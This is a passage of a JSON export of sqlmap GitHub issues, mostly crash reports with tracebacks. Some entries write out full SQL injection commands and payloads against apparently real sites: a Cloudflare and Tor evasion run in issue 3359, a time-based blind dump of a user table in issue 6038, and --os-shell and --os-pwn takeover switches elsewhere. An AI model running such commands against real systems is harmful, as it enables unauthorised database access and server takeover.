+    "description": "```\nRunning version: 1.10.3.10#dev\nPython version: 3.13.5\nOperating system: Windows-11-10.0.26200-SP0\nCommand line: sqlmap.py --shell\nTechnique: None\nBack-end DBMS: None\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2954, in init\n    _setTorProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2520, in _setTorProxySettings\n    _setTorSocksProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2554, in _setTorSocksProxySettings\n    raise SqlmapConnectionException(errMsg)\nlib.core.exception.SqlmapConnectionException: can't establish connection with the Tor SOCKS proxy. Please make sure that you have Tor service installed and setup so you could be able to successfully use switch '--tor' \n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 250, in main\n    raise SystemExit\nSystemExit\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2954, in init\n    _setTorProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2520, in _setTorProxySettings\n    _setTorSocksProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2554, in _setTorSocksProxySettings\n    raise SqlmapConnectionException(errMsg)\nlib.core.exception.SqlmapConnectionException: can't establish connection with the Tor SOCKS proxy. Please make sure that you have Tor service installed and setup so you could be able to successfully use switch '--tor' \n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 250, in main\n    raise SystemExit\nSystemExit\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2947, in init\n    _cleanupEnvironment()\n    ~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 1995, in _cleanupEnvironment\n    if issubclass(_http_client.socket.socket, socks.socksocket):\n       ~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nTypeError: issubclass() arg 1 must be a class\n```",
+    "labels": [
+      "bug"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-30T04:08:13+00:00",
+    "closed_at": "2026-03-30T08:59:48+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6040",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.10.3.10#dev\nPython version: 3.13.5\nOperating system: Windows-11-10.0.26200-SP0\nCommand line: sqlmap.py --shell\nTechnique: None\nBack-end DBMS: None",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2954, in init\n    _setTorProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2520, in _setTorProxySettings\n    _setTorSocksProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2554, in _setTorSocksProxySettings\n    raise SqlmapConnectionException(errMsg)\nlib.core.exception.SqlmapConnectionException: can't establish connection with the Tor SOCKS proxy. Please make sure that you have Tor service installed and setup so you could be able to successfully use switch '--tor' \n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 250, in main\n    raise SystemExit\nSystemExit\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2954, in init\n    _setTorProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2520, in _setTorProxySettings\n    _setTorSocksProxySettings()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 2554, in _setTorSocksProxySettings\n    raise SqlmapConnectionException(errMsg)\nlib.core.exception.SqlmapConnectionException: can't establish connection with the Tor SOCKS proxy. Please make sure that you have Tor service installed and setup so you could be able to successfully use switch '--tor' \n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 250, in main\n    raise SystemExit\nSystemExit\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2947, in init\n    _cleanupEnvironment()\n    ~~~~~~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 1995, in _cleanupEnvironment\n    if issubclass(_http_client.socket.socket, socks.socksocket):\n       ~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nTypeError: issubclass() arg 1 must be a class",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 3359,
+    "title": "Issues Report (maybe Error in actually version)Screenshot intext",
+    "description": "Hey Guys, listen easy Bug Report try to bypass that stupid Cloudflare and cannot read the database because output was an 403 Forbidden. (protected by Cloudflare) if ill open in Browser, the Response is 404 File not Found (Injection in this ) Here´s sqlmap:\r\n\r\nC:\\Users\\Tareck\\Desktop\\sqlmapproject-sqlmap-db5ae9a>sqlmap.py -u \"http://www.Awesomewebsite.de/deal.php?action=add_product\" --data=\"products_qty=1&products_id=46734&products_title=Fire&products_cover=http://static1.Awesomewebsite.com/ga/images/product_images/46734/images/covers/thumbnail200.jpg&products_os=XWsp&products_url=http://www.Awesomewebsite.de/download/Fire.html' OR MAKE_SET(6398=6398,1740) OR 'arGQ'='&products_shippingtype=Digital per E-Mail&products_button=Buy&productBuyButton=HRFI\" --level 5 --risk 3 --user-agent=\"Mozilla 5\" -p products_url \"--header=User-Agent: Opera\" --cookie=security=low --dbs --no-cast --drop-set-cookie  --dbs  --tamper=between,space2dash,randomcase -v 3 --tor  --fresh-queries\r\n        ___\r\n       __H__\r\n ___ ___[)]_____ ___ ___  {1.2.10.39#dev}\r\n|_ -| . [(]     | .'| . |\r\n|___|_  [)]_|_|_|__,|  _|\r\n      |_|V          |_|   http://sqlmap.org\r\n\r\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\r\n\r\n[*] starting at 21:58:58\r\n\r\n[21:58:58] [DEBUG] cleaning up configuration parameters\r\n[21:58:58] [WARNING] increasing default value for option '--time-sec' to 10 because switch '--tor' was provided\r\n[21:58:58] [INFO] setting Tor SOCKS proxy settings\r\n[21:58:59] [INFO] loading tamper module 'between'\r\n[21:58:59] [INFO] loading tamper module 'space2dash'\r\n[21:58:59] [INFO] loading tamper module 'randomcase'\r\nit appears that you might have mixed the order of tamper scripts. Do you want to auto resolve this? [Y/n/q] y\r\n[21:59:02] [DEBUG] setting the HTTP timeout\r\n[21:59:02] [DEBUG] setting the HTTP Cookie header\r\n[21:59:02] [DEBUG] setting the HTTP User-Agent header\r\n[21:59:02] [DEBUG] creating HTTP requests opener object\r\n[21:59:02] [DEBUG] setting the HTTP Referer header to the target URL\r\n[21:59:02] [DEBUG] setting the HTTP Host header to the target URL\r\n[21:59:02] [DEBUG] provided parameter 'products_url' is not inside the GET\r\n[21:59:02] [WARNING] it appears that you have provided tainted parameter values ('products_url=http://www.Awesomewebsite.de/download/Fire.html' OR MAKE_SET(6398=6398,1740) OR 'arGQ'='') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly\r\nare you really sure that you want to continue (sqlmap could have problems)? [y/N] y\r\n[21:59:03] [DEBUG] provided parameter 'products_url' is not inside the Cookie\r\n[21:59:03] [INFO] resuming back-end DBMS 'mysql'\r\n[21:59:03] [INFO] testing connection to the ",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2018-11-04T21:29:32+00:00",
+    "closed_at": "2018-11-05T15:46:13+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/3359",
+    "language": "Python",
+    "author": "Taareck89",
+    "comments_count": 3,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6038,
+    "title": "[ERROR] invalid character detected. retrying.. infinite loop / very slow progress on stable time-based blind (MySQL/MariaDB) with frequent 500 errors",
+    "description": "### Environment / Setup\n\n- sqlmap version: 1.7#stable (also tested on latest dev branch 1.10.2.18#dev - same behavior)\n- OS: Windows 11 (also tested on Linux / git master)\n- DBMS: MySQL >= 5.0.0 (MariaDB fork)\n- Web stack: Laravel + Apache\n- Injection type: time-based blind (Parameter replace - substraction)\n  Confirmed payload example: od=(SELECT 7020 FROM (SELECT(SLEEP(10)))UDQx)\n- Technique: --technique=T (or BUSETQ - T dominant)\n- Tamper scripts: between,space2comment,apostrophemask (tried reducing to only space2comment - same)\n- Charset / encoding: --hex --encoding=utf-8 (tried utf8, ISO-8859-2, removed)\n- Other flags: --level=5 --risk=3 --prefix=\"'\" --suffix=\"'\" --time-sec=10..12 --delay=3..4 --retries=5..6 --threads=1 --no-cast (when compatible)\n\n### Problem description\n\n\nsqlmap.py -u \"https://www.asdfasdfasdf.pl/asdfasdfy/asdfasdfasdf-asdfasdfasd/asdfasdfasdfasd?ciag=&filtruj=1&bezcyfr=1&bezmyslnikow=1&idn=1&od=test&do=&funk=1&regio=1&dotpl=1&wygasaza=1\" -p \"od\" --dbms=mysql --level=3 --risk=3 --random-agent --batch --tamper=between,space2comment,apostrophemask --time-sec=12 --delay=4 --timeout=90 --retries=6 --threads=1 --hex --encoding=utf-8 --cookie=\"laravel_session=asdfasdfasdfasdf465a4sd65f4a65s4dg65asdg\" --headers=\"Host: www.asdgasdgasdg.pl\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\nAccept-Encoding: gzip, deflate\\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\\nReferer: https://www.asdfgasdgasdg.pl/asdfasd/asdfasdf/asdfasdf\" --technique=BUSETQ --prefix=\"'\" --suffix=\"'\" -D asdasd -T lara_users --columns\n\nWhen dumping columns or data from a table (e.g. lara_users which has 76 columns), sqlmap finds characters correctly at first, but then enters an **infinite / very long retry loop** with:\n[ERROR] invalid character detected. retrying..\n[WARNING] increasing time delay to X seconds\ntextDelay value gradually increases (2s → 3s → 4s → ... up to hundreds of seconds), but validation never succeeds.\n\nThis makes enumeration extremely slow or practically stuck (e.g. one column name can take 30–60+ minutes or never finish).\n\n### Observed behavior / logs snippet\n[INFO] fetching columns for table 'lara_users' in database 'asdasdasd'\n[INFO] resumed: 76\n[INFO] resumed: id\n[INFO] resumed: iledomenpromo\n[INFO] resumed: limit_przechwycen\n[INFO] resumed: resellbi\\x8a\\xcfid   <-- already some garbage/escaped chars\n[INFO] resumed: ascio_id\n[INFO] resumed: name\n[INFO] resumed: email\n[INFO] testing next character...\n[PAYLOAD] (SELECT/**/... HEX(IFNULL(CAST(column_name AS NCHAR),0x20)) ... LIMIT 7,1 ... ORD(MID(...,1,1)) NOT BETWEEN 0 AND 66 ...\n[DEBUG] got HTTP error code: 500 ('Internal Server Error') multiple times\n[WARNING] detected HTTP code '500' in validation phase is differing from expected '200'\n[ERROR] invalid character detected. retrying..\n[WARNING] increasing time delay to 3 seconds\n[ERROR] invalid character detected. retrying..\n...\ntext- Many 500 Internal Server Errors during validation ",
+    "labels": [
+      "bug report"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-22T13:49:41+00:00",
+    "closed_at": "2026-03-22T17:16:54+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6038",
+    "language": "Python",
+    "author": "CarlosJasua",
+    "comments_count": 1,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6036,
+    "title": "Unhandled exception (#cdb7b3c0)",
+    "description": "```\nRunning version: 1.9.6.3#dev\nPython version: 3.12.10\nOperating system: Windows-10-10.0.19045-SP0\nCommand line: sqlmap.py -d ******************************************************************* --os-shell\nTechnique: DIRECT\nBack-end DBMS: MySQL (identified)\n```\n```\nTraceback (most recent call last):\n  File \"plugins/dbms/mysql/connector.py\", line 36, in connect\n    self.connector = pymysql.connect(host=self.hostname, user=self.user, passwd=self.password, db=self.db, port=self.port, connect_timeout=conf.timeout, use_unicode=True)\n                     ^^^^^^^\nNameError: name 'pymysql' is not defined\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 222, in main\n    start()\n  File \"lib/core/decorators.py\", line 80, in _\n    result = f(*args, **kwargs)\n             ^^^^^^^^^^^^^^^^^^\n  File \"lib/controller/controller.py\", line 281, in start\n    action()\n  File \"lib/controller/action.py\", line 33, in action\n    setHandler()\n  File \"lib/controller/handler.py\", line 175, in setHandler\n    conf.dbmsConnector.connect()\n  File \"plugins/dbms/mysql/connector.py\", line 37, in connect\n    except (pymysql.OperationalError, pymysql.InternalError, pymysql.ProgrammingError, struct.error) as ex:\n            ^^^^^^^\nNameError: name 'pymysql' is not defined\n```",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-03-20T03:19:15+00:00",
+    "closed_at": "2026-03-20T08:32:05+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6036",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.9.6.3#dev\nPython version: 3.12.10\nOperating system: Windows-10-10.0.19045-SP0\nCommand line: sqlmap.py -d ******************************************************************* --os-shell\nTechnique: DIRECT\nBack-end DBMS: MySQL (identified)",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"plugins/dbms/mysql/connector.py\", line 36, in connect\n    self.connector = pymysql.connect(host=self.hostname, user=self.user, passwd=self.password, db=self.db, port=self.port, connect_timeout=conf.timeout, use_unicode=True)\n                     ^^^^^^^\nNameError: name 'pymysql' is not defined\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 222, in main\n    start()\n  File \"lib/core/decorators.py\", line 80, in _\n    result = f(*args, **kwargs)\n             ^^^^^^^^^^^^^^^^^^\n  File \"lib/controller/controller.py\", line 281, in start\n    action()\n  File \"lib/controller/action.py\", line 33, in action\n    setHandler()\n  File \"lib/controller/handler.py\", line 175, in setHandler\n    conf.dbmsConnector.connect()\n  File \"plugins/dbms/mysql/connector.py\", line 37, in connect\n    except (pymysql.OperationalError, pymysql.InternalError, pymysql.ProgrammingError, struct.error) as ex:\n            ^^^^^^^\nNameError: name 'pymysql' is not defined",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6037,
+    "title": "Unhandled exception (#354465f2)",
+    "description": "```\nRunning version: 1.9.7.7#dev\nPython version: 3.13.5\nOperating system: Windows-10-10.0.17763-SP0\nCommand line: sqlmap.py --output-dir=output --url=****************************************************************************** --threads=10 --tamper=space2comment.py --retries=0 --timeout=5 --dbms=mysql,mssql,oracle,sibase,sqlite,pgsql,firebird,access,maxdb --technique=EUBT --random-agent --is-dba --exclude-sysdbs --current-db --forms --batch --answers=*************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************\nTechnique: None\nBack-end DBMS: None\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2944, in init\n    _findPageForms()\n    ~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 496, in _findPageForms\n    if findPageForms(page, conf.url, True, True):\n       ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/core/common.py\", line 4760, in findPageForms\n    url = _urllib.parse.urljoin(url, htmlUnescape(match.group(2)))\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 571, in urljoin\n    urlparse(url, bscheme, allow_fragments)\n    ~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 395, in urlparse\n    splitresult = urlsplit(url, scheme, allow_fragments)\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 516, in urlsplit\n    _check_bracketed_netloc(netloc)\n    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 454, in _check_bracketed_netloc\n    _check_bracketed_host(hostname)\n    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 463, in _check_bracketed_host\n    ip = ipaddress.ip_address(hostname) # Throws Value Error if not IPv6 or IPv4\n  File \"/AppData/Local/Programs/Python/Python313/Lib/ipaddress.py\", line 54, in ip_address\n    raise ValueError(f'{address!r} does not appear to be an IPv4 or IPv6 address')\nValueError: 'hub-server' does not appear to be an IPv4 or IPv6 address\n```",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-03-20T06:19:16+00:00",
+    "closed_at": "2026-03-20T08:26:10+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6037",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 0,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.9.7.7#dev\nPython version: 3.13.5\nOperating system: Windows-10-10.0.17763-SP0\nCommand line: sqlmap.py --output-dir=output --url=****************************************************************************** --threads=10 --tamper=space2comment.py --retries=0 --timeout=5 --dbms=mysql,mssql,oracle,sibase,sqlite,pgsql,firebird,access,maxdb --technique=EUBT --random-agent --is-dba --exclude-sysdbs --current-db --forms --batch --answers=*************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************\nTechnique: None\nBack-end DBMS: None",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"sqlmap.py\", line 177, in main\n    init()\n    ~~~~^^\n  File \"lib/core/option.py\", line 2944, in init\n    _findPageForms()\n    ~~~~~~~~~~~~~~^^\n  File \"lib/core/option.py\", line 496, in _findPageForms\n    if findPageForms(page, conf.url, True, True):\n       ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/core/common.py\", line 4760, in findPageForms\n    url = _urllib.parse.urljoin(url, htmlUnescape(match.group(2)))\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 571, in urljoin\n    urlparse(url, bscheme, allow_fragments)\n    ~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 395, in urlparse\n    splitresult = urlsplit(url, scheme, allow_fragments)\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 516, in urlsplit\n    _check_bracketed_netloc(netloc)\n    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 454, in _check_bracketed_netloc\n    _check_bracketed_host(hostname)\n    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^\n  File \"/AppData/Local/Programs/Python/Python313/Lib/urllib/parse.py\", line 463, in _check_bracketed_host\n    ip = ipaddress.ip_address(hostname) # Throws Value Error if not IPv6 or IPv4\n  File \"/AppData/Local/Programs/Python/Python313/Lib/ipaddress.py\", line 54, in ip_address\n    raise ValueError(f'{address!r} does not appear to be an IPv4 or IPv6 address')\nValueError: 'hub-server' does not appear to be an IPv4 or IPv6 address",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6035,
+    "title": "Unhandled exception (#3f0cce0b)",
+    "description": "```\nRunning version: 1.10.2#stable\nPython version: 3.14.3\nOperating system: Linux-6.18.16-2-cachyos-lts-x86_64-with-glibc2.43\nCommand line: sqlmap.py ****************************** -p user-agent --os-pwn\nTechnique: ERROR\nBack-end DBMS: MySQL (fingerprinted)\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 222, in main\n    start()\n    ~~~~~^^\n  File \"lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 732, in start\n    action()\n    ~~~~~~^^\n  File \"lib/controller/action.py\", line 224, in action\n    conf.dbmsHandler.osPwn()\n    ~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"plugins/generic/takeover.py\", line 156, in osPwn\n    f.write(\"1\")\n    ~~~~~~~^^^^^\nTypeError: a bytes-like object is required, not 'str'\n```",
+    "labels": [
+      "duplicate"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-18T22:57:05+00:00",
+    "closed_at": "2026-03-19T08:12:11+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6035",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.10.2#stable\nPython version: 3.14.3\nOperating system: Linux-6.18.16-2-cachyos-lts-x86_64-with-glibc2.43\nCommand line: sqlmap.py ****************************** -p user-agent --os-pwn\nTechnique: ERROR\nBack-end DBMS: MySQL (fingerprinted)",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"sqlmap.py\", line 222, in main\n    start()\n    ~~~~~^^\n  File \"lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 732, in start\n    action()\n    ~~~~~~^^\n  File \"lib/controller/action.py\", line 224, in action\n    conf.dbmsHandler.osPwn()\n    ~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"plugins/generic/takeover.py\", line 156, in osPwn\n    f.write(\"1\")\n    ~~~~~~~^^^^^\nTypeError: a bytes-like object is required, not 'str'",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6034,
+    "title": "Unhandled exception (#0bfa20ef)",
+    "description": "```\nRunning version: 1.10.3.6#dev\nPython version: 3.10.12\nOperating system: Linux-6.8.0-1024-oracle-aarch64-with-glibc2.35\nCommand line: sqlmap.py -u ******************************************************* --data ******************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************* --level=5 --risk=3 --random-agent --headers=*************************************************************************************************************************************************************************** --tamper=randomcase,space2comment,charencode --random-agent --banner --is-dba --dbs -v 3\nTechnique: None\nBack-end DBMS: None\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 188, in main\n    from lib.controller.controller import start\n  File \"lib/controller/controller.py\", line 15, in <module>\n    from lib.controller.action import action\n  File \"lib/controller/action.py\", line 8, in <module>\n    from lib.controller.handler import setHandler\n  File \"lib/controller/handler.py\", line 77, in <module>\n    from plugins.dbms.spanner import SpannerMap\n  File \"plugins/dbms/spanner/__init__.py\", line 4, in <module>\n    __product__ = DBMS.SPANNERS\nAttributeError: type object 'DBMS' has no attribute 'SPANNERS'\n```",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-03-15T04:10:46+00:00",
+    "closed_at": "2026-03-15T12:10:23+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6034",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 2,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.10.3.6#dev\nPython version: 3.10.12\nOperating system: Linux-6.8.0-1024-oracle-aarch64-with-glibc2.35\nCommand line: sqlmap.py -u ******************************************************* --data ******************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************* --level=5 --risk=3 --random-agent --headers=*************************************************************************************************************************************************************************** --tamper=randomcase,space2comment,charencode --random-agent --banner --is-dba --dbs -v 3\nTechnique: None\nBack-end DBMS: None",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"sqlmap.py\", line 188, in main\n    from lib.controller.controller import start\n  File \"lib/controller/controller.py\", line 15, in <module>\n    from lib.controller.action import action\n  File \"lib/controller/action.py\", line 8, in <module>\n    from lib.controller.handler import setHandler\n  File \"lib/controller/handler.py\", line 77, in <module>\n    from plugins.dbms.spanner import SpannerMap\n  File \"plugins/dbms/spanner/__init__.py\", line 4, in <module>\n    __product__ = DBMS.SPANNERS\nAttributeError: type object 'DBMS' has no attribute 'SPANNERS'",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6033,
+    "title": "Unhandled exception (#9390d4ab)",
+    "description": "```\nRunning version: 1.10.3.4#dev\nPython version: 3.13.11\nOperating system: Linux-6.18.9+kali-amd64-x86_64-with-glibc2.42\nCommand line: /usr/bin/sqlmap -r ******** --risk=3 --level=3 --os-pwn -D **************\nTechnique: BOOLEAN\nBack-end DBMS: MySQL (fingerprinted)\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap\", line 222, in main\n    start()\n    ~~~~~^^\n  File \"/share/sqlmap/lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"/share/sqlmap/lib/controller/controller.py\", line 732, in start\n    action()\n    ~~~~~~^^\n  File \"/share/sqlmap/lib/controller/action.py\", line 224, in action\n    conf.dbmsHandler.osPwn()\n    ~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"/share/sqlmap/plugins/generic/takeover.py\", line 156, in osPwn\n    f.write(\"1\")\n    ~~~~~~~^^^^^\nTypeError: a bytes-like object is required, not 'str'\n```",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-03-13T12:58:28+00:00",
+    "closed_at": "2026-03-13T13:23:17+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6033",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 0,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.10.3.4#dev\nPython version: 3.13.11\nOperating system: Linux-6.18.9+kali-amd64-x86_64-with-glibc2.42\nCommand line: /usr/bin/sqlmap -r ******** --risk=3 --level=3 --os-pwn -D **************\nTechnique: BOOLEAN\nBack-end DBMS: MySQL (fingerprinted)",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"sqlmap\", line 222, in main\n    start()\n    ~~~~~^^\n  File \"/share/sqlmap/lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"/share/sqlmap/lib/controller/controller.py\", line 732, in start\n    action()\n    ~~~~~~^^\n  File \"/share/sqlmap/lib/controller/action.py\", line 224, in action\n    conf.dbmsHandler.osPwn()\n    ~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"/share/sqlmap/plugins/generic/takeover.py\", line 156, in osPwn\n    f.write(\"1\")\n    ~~~~~~~^^^^^\nTypeError: a bytes-like object is required, not 'str'",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6030,
+    "title": "Unhandled exception (#51a1b979)",
+    "description": "```\nRunning version: 1.10.3.4#dev\nPython version: 3.13.11\nOperating system: Linux-6.18.9+****-amd64-x86_64-with-glibc2.42\nCommand line: sqlmap.py -u ************************************************************** --cookie=********************************************************\nTechnique: None\nBack-end DBMS: None\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap.py\", line 222, in main\n    start()\n    ~~~~~^^\n  File \"lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 607, in start\n    injection = checkSqlInjection(place, parameter, value)\n  File \"lib/controller/checks.py\", line 638, in checkSqlInjection\n    page, headers, _ = Request.queryPage(reqPayload, place, content=True, raise404=False)\n                       ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/core/decorators.py\", line 99, in _\n    result = f(*args, **kwargs)\n  File \"lib/request/connect.py\", line 1596, in queryPage\n    page, headers, code = Connect.getPage(url=uri, get=get, post=post, method=method, cookie=cookie, ua=ua, referer=referer, host=host, silent=silent, auxHeaders=auxHeaders, response=response, raise404=raise404, ignoreTimeout=timeBasedCompare)\n                          ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/request/connect.py\", line 998, in getPage\n    processResponse(page, responseHeaders, code, status)\n    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"lib/request/basic.py\", line 386, in processResponse\n    parseResponse(page, responseHeaders if kb.processResponseCounter < PARSE_HEADERS_LIMIT else None, status)\n    